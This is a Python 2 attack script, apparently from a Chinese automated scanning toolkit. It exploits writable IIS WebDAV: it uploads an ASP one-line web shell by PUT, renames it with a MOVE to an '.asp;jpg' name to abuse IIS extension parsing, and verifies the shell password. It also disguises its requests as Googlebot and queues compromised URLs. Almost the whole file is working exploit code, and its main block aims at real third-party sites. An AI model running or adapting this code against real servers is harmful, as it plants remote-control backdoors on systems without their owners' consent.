#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#iis 写入漏洞   IIS  webdav
#http://hi.baidu.com/alalmn/item/edd446646f940234ad3e832a
#神龙 QQ29295842
#blog http://hi.baidu.com/alalmn
#import httplib
import socket
import random  #产生随机数
import string
import threading
import httplib
import sys

from class_Queue import url_exp
from yijuhua_CS import yijuhua_cs

class IIS:
#    def __init__(self,host_port_80):
#        threading.Thread.__init__(self)
#        self.host_port_80=host_port_80
#        self.IIS_webdav(self.host_port_80[7:])
#        #print "%s--close IIS_webdav!!!!!"%(self.host_port_80[7:])
#    #############################################################################
    def assign(self,service, arg=None):
        if service == 'IIS':
            return True, arg

    def scan(self,arg):
        try:
            self.url0, self.url1 = arg
            self.IIS_webdav(self.url1.split('//')[1])
        except Exception,e:
            #print e
            return 0

    def IIS_webdav(self,url,port=80):  #iis 写入漏洞   IIS  webdav
        try:
            self.txt = '/test.txt'
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            remote_ip = socket.gethostbyname(url)
            s.connect((remote_ip , port))
            message = "OPTIONS / HTTP/1.1\r\nHost: %s\r\n\r\n" % url
            s.sendall(message)
            reply = s.recv(1024)
            if 'DAV' in reply:
                #print 'Webdav Is Vulnerable! Try To Hacking....'
                if self.put(url,self.txt):
                    data="http://%s/%s"%(url,self.txt)
                    #print "exp_IISwebdav_put---%s---%s"%(data,"webshell--pass:long")
                    EXP_list=[1,self.url0,self.url1,"USA_exp_IISwebdav_put",data,"",""]
                    #["01可信度","主网址","从网址","漏洞类型","漏洞地址","密码","备注"] 7个
                    url_exp.put(EXP_list,0.5)   #插入队列

                    MOVE_asp=self.sjzf() #随机文件名
                    MOVE_asp+=".asp;jpg"
                    moveheaders = {'User-Agent':'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
                       'Destination':'http://%s/%s' % (url.strip(),MOVE_asp)}
                    if self.move(url,self.txt,moveheaders):
                        data="http://%s/%s"%(url.strip(),MOVE_asp)
                        if yijuhua_cs("asp",data,"long"):   #ASP还是PHP  ,URL地址 ，密码
                        #是
                            EXP_list=[1,self.url0,self.url1,"USA_exp_IISwebdav_move",data,"long","webshell"]
                            #["01可信度","主网址","从网址","漏洞类型","漏洞地址","密码","备注"] 7个
                            url_exp.put(EXP_list,0.5)   #插入队列
                        else:
                        #否
                            EXP_list=[0,self.url0,self.url1,"USA_exp_IISwebdav_move",data,"long","webshell"]
                            #["01可信度","主网址","从网址","漏洞类型","漏洞地址","密码","备注"] 7个
                            url_exp.put(EXP_list,0.5)   #插入队列

#                        print "exp_IISwebdav_move---%s---%s"%(data,"webshell--pass:long")
            #else:
            #    print 'Webdav Is No Vulnerable!'
            return 0
        except Exception,e:
            #print e
            return 0

    def put(self,arg,site):# 上传文件
        putheaders = {'User-Agent':'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'}
        try:
            #with open("80sec.asp") as f:  #马
            #    data=f.read()
            data = '<%eval request("long")%>'
            conn = httplib.HTTPConnection(arg)
            conn.request('PUT',site,data,putheaders)
            httpres = conn.getresponse()
            if httpres.status in [200,201]:
                #print 'PUT  Success Txt:http://%s/shaoxiao.txt Try Move...' % arg.strip()
                return 1
            #else:
            #    print 'Sorry Put Failed!'
            #    sys.exit(1)
            return 0
        except Exception,e:
            #print e
            return 0

    def move(self,arg,site,moveheaders):# move txt to asp
        try:
            conn = httplib.HTTPConnection(arg)
            conn.request('MOVE',site,None,moveheaders)
            httpres = conn.getresponse()
            if httpres.status in [204,201]:#204 code means that already exists
                #print 'Move Success Shell:http://%s/shaoxiao.asp pass:woaini' % arg.strip()
                return 1
            #else:
            #    print 'Sorry Move Failed!'
            #    sys.exit(1)
            return 0
        except Exception,e:
            #print e
            return 0

    def sjzf(self):  #产生一个随机字符
        sj=random.randint(5,10)
        return string.join(random.sample(['z','y','x','w','v','u','t','s','r','q','p','o','n','m','l','k','j','i','h','g','f','e','d','c','b','a'], sj)).replace(' ','')


#################################################http://220.250.0.123
if __name__=='__main__':
    class_www=IIS()
    class_www.scan(class_www.assign('IIS', ("http://www.baidu.com","http://www.ranpeng.com.cn"))[1])






